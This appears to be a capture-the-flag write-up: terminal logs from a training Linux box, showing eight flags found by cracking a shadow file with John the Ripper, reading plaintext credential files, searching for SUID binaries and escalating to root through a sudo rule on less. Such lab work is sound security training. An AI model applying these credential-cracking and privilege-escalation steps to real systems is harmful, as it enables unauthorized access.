**flag-1**
```

student:~\ $ cat /home/student/Desktop/.flag_1
-------------------------------------------------------

 You found 'flag_1:$1$WYmnR327$5C1yY4flBxB1cLjkc92Tq.'

------------ Nice work. Find 7 more. ------------------


student:Documents\ $ john --show my-files/shadow
student:letmein:18197:0:99999:7:::
mitnick:trustno1:18197:0:99999:7:::

2 password hashes cracked, 0 left 
```

**flag-2**

```
john --show my-files/shadow
student:letmein:18197:0:99999:7:::
mitnick:trustno1:18197:0:99999:7:::

su mitnick
Password:

                    ____             __
                  /\  _ \          /\ \
                  \ \ \/\_\  __  __\ \ \____     __   _ __
                    \ \ \/_/_/\ \/\ \ \  __ \  / __ \/\  __\
                    \ \ \L\ \ \ \_\ \ \ \L\ \/\  __/\ \ \/
                      \ \____/\/ ____ \ \_ __/\ \____\ \_\
                      \/___/   /___/> \/___/  \/____/ \/_/
                                  /\___/
                                  \/__/
    ____
  /\  _ \
  \ \ \L\_\    ___     __     __  __     __    ___      __      __   _ __
    \/_\__ \   / ___\ / __ \  /\ \/\ \  / __ \/  _  \  / _  \  / __ \/\  __\
      /\ \L\ \/\ \__//\ \L\.\_\ \ \_/ |/\  __//\ \/\ \/\ \L\ \/\  __/\ \ \/
      \  \____\ \____\ \__/.\_\ \___/ \ \____\ \_\ \_\ \____ \ \____\ \_\
      \/_____/\/____/\/__/\/_/ \/__/   \/____/\/_/\/_/\/___L\ \/____/ \/_/
                                                        /\____/
                                                        \_/__/
                        __  __                  __
                      /\ \/\ \                /\ \__
                      \ \ \_\ \  __  __    ___\ \  _\
                        \ \  _  \/\ \/\ \ /  _  \ \ \/
                        \ \ \ \ \ \ \_\ \/\ \/\ \ \ \_
                          \ \_\ \_\ \____/\ \_\ \_\ \__\
                          \/_/\/_/\/___/  \/_/\/_/\/__/


You found flag_2:$1$PEDICYq8$6/U/a5Ykxw1OP0.eSrMZO0

```

**flag-3**

```
student:~\ $ su - mitnick
Password:

mitnick:Documents\ $ find /var/log/ -type f -name "*.log" 2>/dev/null
/var/log/alternatives.log
/var/log/dpkg.log
/var/log/apt/history.log
/var/log/apt/term.log
/var/log/bootstrap.log
/var/log/mitnick.log
/var/log/ubuntu-advantage.log

mitnick:Documents\ $ cat /var/log/mitnick.log | awk '{print $1}' | sort | uniq | wc -l
102

mitnick:Documents\ $ unzip .secret.zip
Archive:  .secret.zip
[.secret.zip] babbage password:
  inflating: babbage
mitnick:Documents\ $ ls -la
total 24
drwxr-xr-x 1 mitnick mitnick 4096 Jan 19 19:01 .
drwxr-x--- 1 mitnick mitnick 4096 Jan 19 18:37 ..
-rwx--x--x 1 mitnick mitnick  220 Sep  8  2023 .secret.zip
-rw-r--r-- 1 mitnick mitnick   54 Oct 30  2019 babbage
-rw-rw-r-- 1 mitnick mitnick   35 Jan 19 18:37 hash.txt
mitnick:Documents\ $ cat babbage
-----------------
babbage : freedom
-----------------

mitnick:Documents\ $ su babbage
Password:

                    ____             __
                  /\  _ \          /\ \
                  \ \ \/\_\  __  __\ \ \____     __   _ __
                    \ \ \/_/_/\ \/\ \ \  __ \  / __ \/\  __\
                    \ \ \L\ \ \ \_\ \ \ \L\ \/\  __/\ \ \/
                      \ \____/\/ ____ \ \_ __/\ \____\ \_\
                      \/___/   /___/> \/___/  \/____/ \/_/
                                  /\___/
                                  \/__/
    ____
  /\  _ \
  \ \ \L\_\    ___     __     __  __     __    ___      __      __   _ __
    \/_\__ \   / ___\ / __ \  /\ \/\ \  / __ \/  _  \  / _  \  / __ \/\  __\
      /\ \L\ \/\ \__//\ \L\.\_\ \ \_/ |/\  __//\ \/\ \/\ \L\ \/\  __/\ \ \/
      \  \____\ \____\ \__/.\_\ \___/ \ \____\ \_\ \_\ \____ \ \____\ \_\
      \/_____/\/____/\/__/\/_/ \/__/   \/____/\/_/\/_/\/___L\ \/____/ \/_/
                                                        /\____/
                                                        \_/__/
                        __  __                  __
                      /\ \/\ \                /\ \__
                      \ \ \_\ \  __  __    ___\ \  _\
                        \ \  _  \/\ \/\ \ /  _  \ \ \/
                        \ \ \ \ \ \ \_\ \/\ \/\ \ \ \_
                          \ \_\ \_\ \____/\ \_\ \_\ \__\
                          \/_/\/_/\/___/  \/_/\/_/\/__/


You found flag_3:$1$Y9tp8XTi$m6pAR1bQ36oAh.At4G5s3.
```

**flag-4**
```
babbage:~\ $ find . -type f -perm 401
./Documents/stallman
./Documents/woz
./Documents/gates
./Documents/gosling


babbage:~\ $ cat ./Documents/stallman
computer

babbage:~\ $ su stallman
Password:

                    ____             __
                  /\  _ \          /\ \
                  \ \ \/\_\  __  __\ \ \____     __   _ __
                    \ \ \/_/_/\ \/\ \ \  __ \  / __ \/\  __\
                    \ \ \L\ \ \ \_\ \ \ \L\ \/\  __/\ \ \/
                      \ \____/\/ ____ \ \_ __/\ \____\ \_\
                      \/___/   /___/> \/___/  \/____/ \/_/
                                  /\___/
                                  \/__/
    ____
  /\  _ \
  \ \ \L\_\    ___     __     __  __     __    ___      __      __   _ __
    \/_\__ \   / ___\ / __ \  /\ \/\ \  / __ \/  _  \  / _  \  / __ \/\  __\
      /\ \L\ \/\ \__//\ \L\.\_\ \ \_/ |/\  __//\ \/\ \/\ \L\ \/\  __/\ \ \/
      \  \____\ \____\ \__/.\_\ \___/ \ \____\ \_\ \_\ \____ \ \____\ \_\
      \/_____/\/____/\/__/\/_/ \/__/   \/____/\/_/\/_/\/___L\ \/____/ \/_/
                                                        /\____/
                                                        \_/__/
                        __  __                  __
                      /\ \/\ \                /\ \__
                      \ \ \_\ \  __  __    ___\ \  _\
                        \ \  _  \/\ \/\ \ /  _  \ \ \/
                        \ \ \ \ \ \ \_\ \/\ \/\ \ \ \_
                          \ \_\ \_\ \____/\ \_\ \_\ \__\
                          \/_/\/_/\/___/  \/_/\/_/\/__/


You found flag_4:$1$lGQ7QprJ$m4eE.b8jhvsp8CNbuIF5U0
```

**flag-5**
```
stallman:student\ $ cat /var/tmp/5galf
----------------------------------------------------

 You found flag_5:$1$zuzYyKCN$secHwYBXIELGqOv8rWzG00

--------------- sysadmin : passw0rd ----------------
```

**flag-6**

```
sysadmin:student\ $ alias
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias flag='echo You found '\''flag_6:$1$Qbq.XLLp$oj.BXuxR2q99bJwNEFhSH1'\'''
alias grep='grep --color=auto'
alias l='ls -CF'
alias la='ls -A'
alias ll='ls -alF'
alias ls='ls --color=auto'

sysadmin:student\ $ flag
You found flag_6:$1$Qbq.XLLp$oj.BXuxR2q99bJwNEFhSH1
```

**flag-7**

```
sysadmin:~\ $ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/pkexec
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
sysadmin:~\ $ pkexec --version
pkexec version 0.105
sysadmin:~\ $ sudo -l
[sudo] password for sysadmin:
Matching Defaults entries for sysadmin on 8bcd576b1bd6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

sysadmin:~\ $ ls -la /usr/bin/sudo
-rwsr-xr-x 1 root root 166056 Apr  4  2023 /usr/bin/sudo

User sysadmin may run the following commands on 8bcd576b1bd6:
    (ALL : ALL) /usr/bin/less


sysadmin:~\ $ sudo less --help

                    ____             __
                  /\  _ \          /\ \
                  \ \ \/\_\  __  __\ \ \____     __   _ __
                    \ \ \/_/_/\ \/\ \ \  __ \  / __ \/\  __\
                    \ \ \L\ \ \ \_\ \ \ \L\ \/\  __/\ \ \/
                      \ \____/\/ ____ \ \_ __/\ \____\ \_\
                      \/___/   /___/> \/___/  \/____/ \/_/
                                  /\___/
                                  \/__/
    ____
  /\  _ \
  \ \ \L\_\    ___     __     __  __     __    ___      __      __   _ __
    \/_\__ \   / ___\ / __ \  /\ \/\ \  / __ \/  _  \  / _  \  / __ \/\  __\
      /\ \L\ \/\ \__//\ \L\.\_\ \ \_/ |/\  __//\ \/\ \/\ \L\ \/\  __/\ \ \/
      \  \____\ \____\ \__/.\_\ \___/ \ \____\ \_\ \_\ \____ \ \____\ \_\
      \/_____/\/____/\/__/\/_/ \/__/   \/____/\/_/\/_/\/___L\ \/____/ \/_/
                                                        /\____/
                                                        \_/__/
                        __  __                  __
                      /\ \/\ \                /\ \__
                      \ \ \_\ \  __  __    ___\ \  _\
                        \ \  _  \/\ \/\ \ /  _  \ \ \/
                        \ \ \ \ \ \ \_\ \/\ \/\ \ \ \_
                          \ \_\ \_\ \____/\ \_\ \_\ \__\
                          \/_/\/_/\/___/  \/_/\/_/\/__/


You found flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0
```

**flag-8**
```
root@8bcd576b1bd6:/home/student# cat all_flags.txt
flag_1:$1$WYmnR327$5C1yY4flBxB1cLjkc92Tq.
flag_2:$1$PEDICYq8$6/U/a5Ykxw1OP0.eSrMZO0
flag_3:$1$Y9tp8XTi$m6pAR1bQ36oAh.At4G5s3.
flag_4:$1$lGQ7QprJ$m4eE.b8jhvsp8CNbuIF5U0
flag_5:$1$zuzYyKCN$secHwYBXIELGqOv8rWzG00
flag_6:$1$Qbq.XLLp$oj.BXuxR2q99bJwNEFhSH1
flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0


john --show /home/student/all_flags.txt

root@8bcd576b1bd6:/home/student# john all_flags.txt
Created directory: /root/.john
Loaded 7 password hashes with 7 different salts (md5crypt [MD5 32/64 X2])
Press 'q' or Ctrl-C to abort, almost any other key for status
this             (flag_5)
cyber            (flag_6)
challenge.       (flag_7)

root@8bcd576b1bd6:/home/sysadmin# find / -type f -name "all_flags.txt" 2>/dev/null
/home/student/all_flags.txt
root@8bcd576b1bd6:/home/student# john --show all_flags.txt 
flag_3:have
flag_5:this
flag_6:cyber
flag_7:challenge.

4 password hashes cracked, 3 left

```